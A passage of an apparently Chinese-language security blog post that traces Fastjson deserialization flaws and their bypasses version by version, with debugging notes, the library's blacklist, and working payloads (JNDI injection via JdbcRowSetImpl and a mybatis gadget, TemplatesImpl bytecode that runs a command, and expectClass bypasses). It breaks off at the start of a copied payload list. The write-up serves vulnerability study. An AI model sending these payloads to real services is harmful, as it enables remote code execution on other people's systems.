QADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFwAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGgAIABsADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p>修复了之前版本的漏洞，但是采取黑名单的方式来修改的，存在绕过方式</p>
<p>运行之前1.2.24的paylaod报错：</p>
<p><img src="../../../../typara/pictures/image-20230415181330774.png" alt="image-20230415181330774"></p>
<p><code>autoType is not support</code>，来看看这个<code>checkAutoType</code>干了什么：</p>
<ul>
<li>检测<code>autoTypeSupport</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416161618060.png" alt="image-20230416161618060"></p>
<ul>
<li>黑名单<code>denyList</code>检测</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyList = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416161600763.png" alt="image-20230416161600763"></p>
<ul>
<li>指定类格式检测：<code>L</code>&amp;<code>;</code></li>
</ul>
<p>最后如果<code>autoTypeSupport</code>开启的情况下,进入loadclass.对<code>@type</code>指定类的格式进行了检测。这也很好绕过，添加<code>L</code>&amp;<code>;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416162100347.png" alt="image-20230416162100347"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416161907677.png" alt="image-20230416161907677"></p>
<p>最终paylaod：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ckb7j7\&quot;,\&quot;autoCommit\&quot;:true&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>, <span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAHmNvbS9leGFtcGxlL2Zhc3Rqc29uL0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFwAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGgAIABsADAAAAAQAAQAUAAEAFQAAAAIAFg==&quot;</span>], <span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;c.c&#x27;</span>, <span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>问：测试的时候我们是手动改的<code>AutoTypeSupport = true</code>,实际情况中默认为<code>flase</code>怎么打呢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>



<h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><p>把1.2.25的paylaod运行下，报错，依旧是<code>checkAutoType</code>的原因：</p>
<p><code>checkautotype</code>中,添加了一串看不懂的，debug看看变化了什么</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416164551526.png" alt="image-20230416164551526"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416164427064.png" alt="image-20230416164427064"></p>
<p>我们传入的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>被转换成了<code>com.sun.rowset.JdbcRowSetImpl</code>。这段代码这作用是使用hashcode对字符串进行了<code>L</code>&amp;<code>;</code>包裹的内容截取</p>
<p>过了这两个才能进入<code>loadClass</code>,<code>loadClass</code>和之前版本一样。所以我们要使得我们传入<code>loadclass</code>的是<code>L</code>&amp;<code>;</code>包裹的。由此绕过方式就直接在1.2.25的基础上，再套一次<code>L</code>&amp;<code>;</code>。这就能够绕过，最后调用<code> TypeUtils.loadClass</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416172249217.png" alt="image-20230416172249217"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0</span><br><span class="line">//Arrays.binarySearch()方法是Java中的一个工具方法，它用于在一个已经排序好的数组中搜索指定的元素，存在返回返回搜索元素的索引位置，不存在返回一个负数</span><br></pre></td></tr></table></figure>

<p>对上面hash的解释 - from <a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#3-fastjson-1242">su18</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416171751071.png" alt="image-20230416171751071"></p>
<h2 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h2><p>跑一遍<code>1.2.42</code>的paylaod,报错，又在<code>checkAutoType</code>这里抛出了异常</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230416214025828.png" alt="image-20230416214025828"></p>
<p>这个表达式对对类名进行了检测，如果连续出现两个<code>LL</code>就会抛出异常</p>
<p>但是在<code>loadclass</code>里存在递归调用<code>loadclass</code>.针对 <code>[</code> 进行了处理和递归，因此可以利用<code>[</code>来绕过</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/6y0pej&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">       </span><br><span class="line">这里可以变动一下：</span><br><span class="line">[,,,,&#123;</span><br><span class="line">[,&#123;</span><br></pre></td></tr></table></figure>



<h2 id="1-2-44-结束字符串处理导致的黑名单绕过"><a href="#1-2-44-结束字符串处理导致的黑名单绕过" class="headerlink" title="1.2.44 - 结束字符串处理导致的黑名单绕过"></a>1.2.44 - 结束字符串处理导致的黑名单绕过</h2><p>跑一遍<code>1.2.423</code>的paylaod,报错，又双在<code>checkAutoType</code>这里抛出了异常</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417000509352.png" alt="image-20230417000509352"></p>
<p>他检测了我们传入的类，当第一个字符为<code>[</code>时抛出异常。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注：对过滤的理解:定义了特征值,用于被检测的字符串转成ascii码后进行了运算后比较，实际上就是过滤 [ ,这里这么写可能是用来混淆，前面的过滤也是一样的</span><br></pre></td></tr></table></figure>

<p>由字符串处理导致的黑名单绕过也就告一段落了，但我感觉这修复得还是很草率（虽然我不知到能怎么绕）前几个版本都是哪出问题禁哪里，感觉修复的比较水（莫非开发大佬故意的，给搞安全的留口饭吃（狗头保命））</p>
<h2 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h2><p>这个漏洞是因为存在其他组件利用导致的，需要导入<code>mybatis</code>的jar包。适用于<code>&lt;=1.2.45</code></p>
<p>黑名单中不存在<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>，可以直接利用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.45<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>JndiDataSourceFactory</code>中的<code>setProperties</code>方法存在<code>lookup</code>方法。满足<code>set</code>以及<code>lookup</code>这俩个条件，可以利用</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417004053808.png" alt="image-20230417004053808"></p>
<p><code>JndiDataSourceFactory</code>类利用测试demo：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JndiDataSourceFactory</span> <span class="variable">jndiDataSourceFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiDataSourceFactory</span>();</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;data_source&quot;</span>,<span class="string">&quot;ldap://127.0.0.1:1389/6y0pej&quot;</span>);</span><br><span class="line">        jndiDataSourceFactory.setProperties(properties);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1389/6y0pej&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个组件的存在导致了漏洞。那么要是又爆出了可利用的组件是不是又g了。过来了这么久应该有其他可利用组件吧（虽然我不知道）</p>
<h2 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2><p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code><br>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p>
<p>这个版本漏洞最为严重，<code>1.2.25-1.2.45</code>都是需要<code>autoTypeSupport=true</code>的，而他可以在不开启<code>autoTypeSupport</code>的情况下触发漏洞。</p>
<p>问题依旧出在<code>checkAutoType</code>：</p>
<p><code>autoTypeSupport=true</code>的时候会和<code>1.2.44</code>一样被检测抛出异常</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417005356388.png" alt="image-20230417005356388"></p>
<p>如果能够继续往下走到这的话，会从<code>Mapping</code>和<code>deserializers</code>中寻找类，如果存在则返回<code>clazz</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417005938662.png" alt="image-20230417005938662"></p>
<p>在<code>ParserConfig</code>类中，构造方法中调用了<code>initDeserializers</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader, <span class="type">boolean</span> fieldBased)&#123;</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">         <span class="built_in">this</span>.initDeserializers();</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>initDeserializers</code>会向<code>deserializers</code>中添加很多类，类似一种缓存。其中的                            <code>this.deserializers.put(Class.class, MiscCodec.instance);</code>是可以利用的</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417010630623.png" alt="image-20230417010630623"></p>
<p>在<code>MiscCodec</code>类中存在一个<code>deserialze</code>方法，这个方法中对传入的<code>clazz</code>进行了判断，如果是<code>Class.class</code>，那么就会调用<code>TypeUtils.loadClass</code>。这里就接到fastjson后半部分了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417011019769.png" alt="image-20230417011019769"></p>
<p>在<code>TypeUtils.loadClass</code>中，如果<code>cache</code>为true则会将<code>className</code>放到<code>mapping</code>中，其中<code>cache</code>默认为true，<code>className</code>为传进来的<code>strVal</code></p>
<p><code>strVal</code>是由<code>objVal</code>强制转换来的，而<code>objVal = parser.parse();</code>，就是指定的<code>com.sun.rowset.JdbcRowSetImpl</code>对象，</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417012419524.png" alt="image-20230417012419524"></p>
<p>而<code>deserialze</code>中检测了参数名称，必须为<code>val</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417013002094.png" alt="image-20230417013002094"></p>
<p>所以需要在<code>payload</code>中添加上<code>val</code>参数</p>
<p>paylaod：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line"><span class="string">&quot;&#123;\&quot;k4\&quot;: &#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;k3\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:1389/6y0pej\&quot;,\&quot;autoCommit\&quot;: true&#125;\&quot;&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//k4和k2这两个是可以随意修改的    </span></span><br></pre></td></tr></table></figure>

<p>问题：</p>
<p>1，怎么调用了<code>ParserConfig</code>类，从而存在后面的链子的？</p>
<p><code>parse</code>中实例化了这个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417015804670.png" alt="image-20230417015804670"></p>
<p>2，怎么调用到<code>MiscCodec.deserialze()</code>的？</p>
<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417015636524.png" alt="image-20230417015636524"></p>
<p>​    </p>
<p>1.2.47可参考<a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#7-fastjson-1247">su18</a>✌的文章，分析得很清楚！<a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#7-fastjson-1247">https://su18.org/post/fastjson/#7-fastjson-1247</a></p>
<h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。—— form su18</p>
<p>在1.2.68中跟新了一个安全控制点<code>safeMode</code>，在<code>com\alibaba\fastjson\1.2.68\fastjson-1.2.68.jar!\com\alibaba\fastjson\parser\Feature.class</code></p>
<p><code>checkAutoType</code>中检测了<code>safeMode</code>，如果为<code>ture</code>，直接抛出异常</p>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417021648981.png" alt="image-20230417021648981"></p>
<p>但是概版本也爆出了一个新的<code>autoType</code>开关绕过方式：expectClass 绕过 <code>checkAutoType()</code></p>
<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：当expectClass参数不为Null、且当前需要实例化的类型是expectClass的子类或实现时会将传入的类视为一个合法的类（此类不能在黑名单中），就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
<p>期望类<code>expcetClass</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">    expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">            || expectClass == Serializable.class</span><br><span class="line">            || expectClass == Cloneable.class</span><br><span class="line">            || expectClass == Closeable.class</span><br><span class="line">            || expectClass == EventListener.class</span><br><span class="line">            || expectClass == Iterable.class</span><br><span class="line">            || expectClass == Collection.class</span><br><span class="line">            ) &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>Object,Serializable,Cloneable,Closeable,EventListener,Iterable,Collection</code>这几个类不能作为期望类</p>
<p>所以我们只需要找到<code>checkAutoType()</code> 几个重载方法是否有可控的 <code>expectClass</code>:</p>
<ul>
<li><code>JavaBeanDeserializer#deserialze()</code></li>
</ul>
<p>在fastjson中对大部分类都指定了特定的deserializer，而AutoCloseable类没有，通过继承/实现AutoCloseable的类可以绕过autotype反序列化</p>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417024621943.png" alt="image-20230417024621943"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.fastjson.execCloseable&quot;</span>,<span class="string">&quot;domain&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>ThrowableDeserializer#deserialze()</code></p>
<p>deserialze() 方法直接将 @type后的类传入<code> checkAutoType()</code> ，并且 expectClass 为 <code>Throwable.class</code>。通过 <code>checkAutoType()</code> 之后，将使用 <code>createException</code> 来创建异常类的实例，这就形成了 <code>Throwable</code> 子类绕过 <code>checkAutoType()</code> 的方式</p>
</li>
</ul>
<p><img src="http://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230417023905826.png" alt="image-20230417023905826"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试demo</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">execException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">execException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个很鸡肋，命令执行是写在异常类处理中的，实际中少有开发者会这么写</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.example.fastjson.execException&quot;</span><span class="punctuation">,</span><span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span><span class="string">&quot;calc&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>问题：添加expectClass的原因？</p>
<p>存在的原因应当是例如 <code>com.cyx.A</code> 为白名单， <code>com.cyx.A</code> 的构造方法中或setter中存在 <code>com.cyx.B</code>，那么要想实例化 <code>com.cyx.A</code> 则需要传入 <code>com.cyx.B</code> 对象，而 <code>com.cyx.B</code> 并不在白名单中，所以将其作为expectClass参数传入checkAutoType方法中检测该类是否合法，如果是 <code>com.cyx.B</code> 的子类或实现则视为合法的类。</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这些payload都是从su18师傅博客中搬过来的，还没有挨个测试过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 